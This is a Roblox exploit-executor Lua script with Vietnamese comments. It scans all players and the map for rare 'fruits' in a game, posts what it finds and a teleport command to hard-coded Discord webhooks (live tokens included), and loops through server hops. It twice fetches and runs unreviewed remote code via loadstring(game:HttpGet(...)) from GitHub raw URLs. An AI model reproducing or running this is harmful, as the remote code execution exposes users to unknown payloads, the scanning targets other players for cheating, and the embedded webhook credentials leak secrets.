--[[  
    🚀 PERFECT SERVER HOP V5 (0% FAIL, NO DUPLICATE, DISCORD LOG)
    ✅ Tự động hop mượt, retry liên tục nếu request lỗi.
    ✅ Không vào lại server cũ, không bị stuck, không chờ delay.
    ✅ Gửi log Discord mỗi khi teleport thành công.
    ⚙️ Dùng được với Synapse, Solara, Krnl, Fluxus, v.v.
--]]
-- Check fruits in players' Backpack/Character/Workspace + Discord embed webhook
-- Dùng trong exploit client (Synapse, Krnl, v.v.)
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")

-- Cấu hình webhook
local WEBHOOK_URL = "https://discord.com/api/webhooks/1420703163027292222/uVVi0t2O3HYkb6Q8DXXVO6ZjsF1ilojAkss_M07rT46l2z0OFIYB_eurzTAA1Z9886Am"

-- Danh sách trái quan tâm
local TARGET_FRUITS = {
    ["Gas Fruit"]=true,   ["Flare Fruit"]=true, ["Sand Fruit"]=true,
    ["Rare Box"]=true, ["Chilly Fruit"]=true, ["Rumble Fruit"]=true,
    ["Magma Fruit"]=true, ["Phoenix Fruit"]=true, ["Quake Fruit"]=true,
    ["Ultra Rare Box"]=true,["String Fruit"]=true, ["Dark Fruit"]=true, ["Light Fruit"]=true, ["Candy Fruit"]=true,["Hollow Fruit"]=true,["Vampire Fruit"]=true
}

-- Rate-limit local
local MIN_SECONDS_BETWEEN_WEBHOOKS = 3
local lastWebhookTime = 0

-- helper: build teleport command
local function BuildTeleportCommand()
    local placeId = tostring(game.PlaceId or "nil")
    local jobId = tostring(game.JobId or "nil")
    local teleportCmd = string.format(
        'game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s", game.Players.LocalPlayer)',
        placeId, jobId
    )
    return placeId, jobId, teleportCmd
end

-- copy to clipboard (support vài executor)
local function TryCopyClipboard(text)
    if setclipboard then
        pcall(setclipboard, text)
    elseif toclipboard then
        pcall(toclipboard, text)
    elseif clip and clip.set then
        pcall(function() clip.set(text) end)
    end
end

-- request wrappers
local function try_http_request(jsonPayload)
    local req = (http and http.request) or request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
    if req then
        return pcall(function()
            return req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = jsonPayload
            })
        end)
    end
    return false, "no_http_request"
end

local function SendEmbedWebhookEmbed(title, fields, color)
    if tick() - lastWebhookTime < MIN_SECONDS_BETWEEN_WEBHOOKS then
        return false, "rate_limited_local"
    end

    local embed = {
        title = title,
        color = color or 3066993,
        fields = fields,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    local payload = { embeds = { embed } }
    local jsonPayload = HttpService:JSONEncode(payload)

    local ok, res = try_http_request(jsonPayload)
    if ok then lastWebhookTime = tick(); return true, res end
    return false, res
end

-- 🔥 Hàm quét người chơi cầm fruit + fruit trong workspace
-- Kết quả: bảng found như { ["PlayerName"] = { "Gas Fruit (Backpack)", "Rumble Fruit (Character)" }, ["Workspace"] = { "Quake Fruit @ Workspace.Island.Drop1" } }
local function ScanPlayersForFruits()
    local found = {}

    -- 1) Quét Backpack & Character
    for _, plr in ipairs(Players:GetPlayers()) do
        -- Backpack
        local backpack = plr:FindFirstChild("Backpack")
        if backpack then
            for _, item in ipairs(backpack:GetChildren()) do
                if TARGET_FRUITS[item.Name] then
                    found[plr.Name] = found[plr.Name] or {}
                    table.insert(found[plr.Name], item.Name .. " (Backpack)")
                end
            end
        end

        -- Character
        if plr.Character then
            for _, item in ipairs(plr.Character:GetChildren()) do
                if item:IsA("Tool") and TARGET_FRUITS[item.Name] then
                    found[plr.Name] = found[plr.Name] or {}
                    table.insert(found[plr.Name], item.Name .. " (Character)")
                end
            end
        end
    end

    -- 2) Quét Workspace (tools/objects rơi ra / để sẵn)
    for _, obj in ipairs(Workspace:GetDescendants()) do
        if obj:IsA("Tool") and TARGET_FRUITS[obj.Name] then
            -- Nếu tool đang thuộc về một model player thì có khả năng đã đếm ở trên (character)
            local parentModel = obj.Parent
            local isPlayerModel = parentModel and parentModel:IsA("Model") and Players:FindFirstChild(parentModel.Name)
            if not isPlayerModel then
                found["Workspace"] = found["Workspace"] or {}
                -- dùng GetFullName nếu có để cung cấp đường dẫn đầy đủ; fallback về Parent.Name
                local path = (pcall(function() return obj:GetFullName() end) and obj:GetFullName()) or ("Workspace/" .. tostring(obj.Parent and obj.Parent.Name or "Unknown"))
                table.insert(found["Workspace"], obj.Name .. " @ " .. path)
            else
                -- Nếu tool đang ở trong Model của player nhưng không phải Tool trong Character (đã kiểm tra Character trước),
                -- vẫn có thể xuất hiện (ví dụ rơi trong model), ta thêm gợi ý
                local ownerName = parentModel.Name
                found[ownerName] = found[ownerName] or {}
                local path = (pcall(function() return obj:GetFullName() end) and obj:GetFullName()) or ("Model/" .. ownerName)
                table.insert(found[ownerName], obj.Name .. " (In Model) @ " .. path)
            end
        end
    end

    return found
end

-- Build embed fields
local function BuildEmbedFields(foundTable, teleportCmd)
    local fields = {}
    for plrName, items in pairs(foundTable) do
        local value = "Đang cầm/ở: **" .. table.concat(items, ", ") .. "**"
        table.insert(fields, {
            name = "👤 "..plrName,
            value = value,
            inline = false
        })
    end
    table.insert(fields, { name = "Teleport Script", value = "```lua\n"..teleportCmd.."\n```", inline = false })
    return fields
end

-- Main
local function CheckServerAndReport()
    local foundTable = ScanPlayersForFruits()
    if next(foundTable) == nil then
        print("❌ Không có ai cầm/ở fruit list trong server này.")
loadstring(game:HttpGet("https://raw.githubusercontent.com/cthanh137/MyHub.lua/refs/heads/main/Hopsever%20Fruit.lua"))()
        return
    end

    local _, _, teleportCmd = BuildTeleportCommand()
    TryCopyClipboard(teleportCmd)

    local fields = BuildEmbedFields(foundTable, teleportCmd)
    local ok, res = SendEmbedWebhookEmbed("📢 Phát hiện người chơi / workspace có fruit", fields, 15158332)
    if ok then
loadstring(game:HttpGet("https://raw.githubusercontent.com/cthanh137/MyHub.lua/refs/heads/main/AMDMain.lua"))()
        print("✅ Đã gửi thông báo Discord.")
    else
        warn("Webhook gửi thất bại:", res)

    end
end

-- Chạy 1 lần
CheckServerAndReport()


local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()

-- 🔗 Webhook Discord
local WEBHOOK_URL = "https://discord.com/api/webhooks/1429493470531424407/97lyF_Xu50SPQ8DXiXTc5B-vEhZD2UwehBqnC37VMlR2ZVX7mR3e18iwZsZ2TV0LViQP"

-- ⚙️ Config
local PLACE_ID = game.PlaceId
local MAX_PAGES = 100
local RETRY_DELAY = 0.05 -- cực nhỏ, hop siêu nhanh

-- 🕒 Format thời gian
local function GetTimestamp()
	local t = os.date("!*t")
	return string.format("%02d/%02d/%04d %02d:%02d:%02d UTC", t.day, t.month, t.year, t.hour, t.min, t.sec)
end

-- 📤 Gửi log Discord
local function SendDiscordLog(jobId)
	local data = {
		username = "Server Hop Logger",
		embeds = {{
			title = "✅ Teleport Thành Công!",
			description = string.format(
				"**Người chơi:** %s\n**Job ID:** %s\n**Place ID:** %s\n**Thời gian:** %s",
				LocalPlayer.Name, jobId, PLACE_ID, GetTimestamp()
			),
			color = 65280
		}}
	}
	pcall(function()
		request({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode(data)
		})
	end)
end

-- 🧠 Lưu danh sách server đã vào
local TriedServers = TeleportService:GetTeleportSetting("TriedServersList")
if typeof(TriedServers) ~= "table" then
	TriedServers = {}
end
TriedServers[game.JobId] = true
TeleportService:SetTeleportSetting("TriedServersList", TriedServers)

-- 🔍 Hàm request an toàn (retry vô hạn cho đến khi có phản hồi hợp lệ)
local function SafeRequest(url)
	while true do
		local ok, res = pcall(function()
			return request({Url = url, Method = "GET"})
		end)
		if ok and res and res.StatusCode == 200 then
			local success, data = pcall(function()
				return HttpService:JSONDecode(res.Body)
			end)
			if success and data and data.data then
				return data
			end
		end
		task.wait(RETRY_DELAY)
	end
end

-- 🚀 Tìm server mới chưa từng vào
local function FindServer()
	local cursor = ""
	for _ = 1, MAX_PAGES do
		local url = string.format(
			"https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100&cursor=%s",
			PLACE_ID, cursor
		)
		local data = SafeRequest(url)

		for _, server in ipairs(data.data) do
			if not TriedServers[server.id] and server.playing < server.maxPlayers then
				return server.id
			end
		end

		cursor = data.nextPageCursor or ""
		if cursor == "" then break end
	end
	return nil
end

-- 🔁 Loop vô hạn, retry cho đến khi teleport thành công
while true do
	local newServer = FindServer()
	if newServer then
		print("🔁 Teleporting to server:", newServer)
		TriedServers[newServer] = true
		TeleportService:SetTeleportSetting("TriedServersList", TriedServers)
		SendDiscordLog(newServer)

		local ok, err = pcall(function()
			TeleportService:TeleportToPlaceInstance(PLACE_ID, newServer, LocalPlayer)
		end)

		if ok then
			break -- teleport thành công => script dừng tại đây
		else
			warn("⚠️ Teleport lỗi:", err)
			task.wait(RETRY_DELAY)
		end
	else
		-- nếu hết server => reset danh sách
		warn("🔄 Hết server, reset danh sách và thử lại...")
		TriedServers = {}
		TriedServers[game.JobId] = true
		TeleportService:SetTeleportSetting("TriedServersList", TriedServers)
		task.wait(RETRY_DELAY)
	end
end

-- ✅ Gửi log khi mới load
task.defer(function()
	task.wait(1)
	SendDiscordLog(game.JobId)
end)
